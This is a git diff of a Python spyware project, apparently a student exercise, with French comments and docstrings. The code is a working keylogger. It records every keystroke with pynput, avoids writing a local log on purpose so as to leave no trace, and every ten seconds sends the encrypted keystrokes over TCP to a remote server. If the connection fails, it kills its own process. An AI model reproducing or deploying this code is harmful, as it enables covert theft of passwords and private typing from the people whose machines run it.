@@ -1,4 +1,5 @@
-## Bibliothèque importée
+
+# Bibliothèque importée
 
 import subprocess
 from env import *
@@ -12,12 +13,35 @@ from pynput.keyboard import Listener
 from chiffrement import *
 
 # déclaration variable globale
-
-
 TXT_GLOB = ""
 
 
+def argument():
+
+    """
+            Cette fonction utilise le module argparse pour définir et analyser des arguments de ligne de commande
+            pour un programme le projet Spyware.
+            :return: L'argument
+
+    """
+
+    p = argparse.ArgumentParser(description='Projet Python - Spyware')
+    p.add_argument('-l', '--listen', type=int, help="se met en écoute sur le port TCP saisi par "
+                                                    "l'utilisateur et attend les données du spyware UP")
+    args = p.parse_args()
+    return args
+
+
 def pav_num():
+
+    """
+
+    Cette fonction permet de récupérer les codes de touches du pavé numérique puis les associés avec la valeur
+    correspondante. Cette fonction a été créer pour résoudre les problèmes de traduction sur le pavé numérique.
+    :return: La valeur associée dans le dictionnaire.
+
+    """
+
     touche = {
 
         "<96>": "0",
@@ -36,11 +60,25 @@ def pav_num():
 
 
 def kill_all():
+
+    """
+    Permet d'arrêter instantanément le script sans opération de nettoyage.
+    :return: Rien
+    """
     pid = os.getpid()
     os.kill(pid, 9)
 
 
 def parse(srt):
+
+    """
+    Cette fonction prend en paramètre un caractère afin de l'analyser.
+    Cela permet de remplacer des commandes clavier en une commande lisible.
+    :param srt: Prend en paramètre un caractère.
+    :return: Le caractère corrigé.
+
+    """
+
     pattern = r'<\d+>'
     new_str = srt.replace("'", "")
     new_str = new_str.replace("Key.space", " ")
@@ -58,13 +96,30 @@ def parse(srt):
 
 
 def kpr(key):
+
+    """
+    Cette fonction est utilisée dès qu'une touche clavier est pressée.
+    Elle est ensuite analysée par la fonction Parse
+    :param key: La commande de la touche pressée
+    :return: rien
+    """
     global TXT_GLOB
     # with open("keylog.txt", "a") as f: ## pas de fichier ca laisse une trace c'est nul
-    # f.write(parse(str(key)))
+    # f.write(parse(str(key)))m^ùp$=
     TXT_GLOB += parse(str(key))
 
 
 def scan_socket(port):
+
+    """
+    Cette fonction créée un objet socket avec l'IP4 et le type.
+    Elle attend un temps de réponse et vérifie la connection.
+    Si elle réussit, elle envoie un message de connection.
+    Sinon, elle renvoie un message d'échec et stop le script.
+
+    :param port:  Récupère le numéro de port
+    :return: rien
+    """
     try:
         rsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP
 
@@ -73,52 +128,36 @@ def scan_socket(port):
         if port:
             rsocket.connect((SRV, port))
         else:
-            rsocket.connect((SRV, PORT))
+            rsocket.connect((SRV, PORT))   # À voir peut-être pas nécessaire
 
-        print("Toujours Co !!")
+        print("Connection établie ")
     except TimeoutError:
-        print("Pas Co !!")
+        print("Echec de connection")
         kill_all()
 
 
-def argument():
-    p = argparse.ArgumentParser(description='Projet Python - Spyware')
-    p.add_argument('-l', '--listen', type=int, help="se met en écoute sur le port TCP saisi par "
-                                                    "l'utilisateur et attend les données du spyware UP")
-    args = p.parse_args()
-    return args
-
-
-def chrono():
-    arg = argument()
-    global TXT_GLOB
-    while True:
-        seconds = 0
-        while True:
-            try:
-
-                print(f"Secondes : {seconds}")
-                seconds += 1
-                scan_socket(arg.listen)  ############ le probleme de merde !!!
-                time.sleep(1)
-
-                if seconds % 10 == 0:
-                    send_t = threading.Thread(target=send(TXT_GLOB, arg.listen))
-                    send_t.start()
-                    # print(TXT_GLOB)
-                    TXT_GLOB = ""
-                if seconds == 600:
-                    return 0
-            except:
-                kill_all()
-
-
 def keylogger():
+
+    """
+    Fonction qui permet de vérifier qu'une touche a bien été presser et relâcher.
+    Permet d'enregistrer les touches du clavier.
+    :return: Rien
+    """
     with Listener(on_press=kpr) as listener:
         listener.join()
 
 
 def send(data, port):
+
+    """
+    Cette fonction permet d'envoyer les données du client vers le serveur.
+    Lors de l'envoi, elle chiffre les données grâce à la fonction Chiffrement.
+    S'il y a un échec, elle arrête le script grâce à la fonction kill_all().
+    :param data: Argument les données à envoyer.
+    :param port: Port de la connection.
+    :return:
+    """
+
     try:
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -129,11 +168,14 @@ def send(data, port):
 
         client_socket.send(chiffrement(data))  # envoi
         client_socket.close()
-    except:
+    except Exception as e:
+        print(f"Erreur lors de l'envoi : {e}")
         kill_all()
 
 
+# Fonction non utile
 def commands(cmd, port):
+
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     client_socket.connect((SRV, port))
@@ -143,10 +185,49 @@ def commands(cmd, port):
     client_socket.close()
 
 
-chrono_t = threading.Thread(target=chrono)
+def chrono():
 
-chrono_t.start()
+    """
+    Cette fonction est un chronomètre effectuant plusieurs actions.
+    Elle prend un argument avec la fonction argument.
+    Puis dans une boucle infinie, elle vérifie la connection entre le client et le serveur.
+    Elle envoie avec la fonction send dans un Thread le contenu de la variable globale `TXT_GLOB`
+    toutes les 10 secondes au serveur.
+    Elle met fin à la connection au bout de 600 secondes.
+    En cas d'échec elle stop le script
+    :return: Rien
+    """
 
-keylog_t = threading.Thread(target=keylogger)
+    arg = argument()
+    global TXT_GLOB
+    while True:
+        seconds = 0
+        while True:
+            try:
 
-keylog_t.start()
+                print(f"Secondes : {seconds}")
+                seconds += 1
+                scan_socket(arg.listen)  # le problème de merde !!!
+                time.sleep(1)
+
+                if seconds % 10 == 0:
+                    send_t = threading.Thread(target=send(TXT_GLOB, arg.listen))
+                    send_t.start()
+                    # print(TXT_GLOB)
+                    TXT_GLOB = ""
+                if seconds == 600:
+                    return 0
+            except Exception as e:
+                print(f"Erreur lors de l'envoi : {e}")
+                kill_all()
+
+
+if __name__ == '__main__':
+
+    chrono_t = threading.Thread(target=chrono)
+
+    chrono_t.start()
+
+    keylog_t = threading.Thread(target=keylogger)
+
+    keylog_t.start()
